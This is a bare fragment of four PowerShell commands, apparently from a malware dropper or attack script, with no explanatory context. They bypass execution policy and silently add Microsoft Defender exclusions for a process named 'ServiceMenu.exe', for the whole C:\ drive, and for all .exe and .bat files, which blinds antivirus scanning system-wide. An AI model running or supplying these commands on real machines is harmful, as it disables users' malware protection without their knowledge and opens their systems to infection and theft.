PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'ServiceMenu.exe'"
PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension exe
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension bat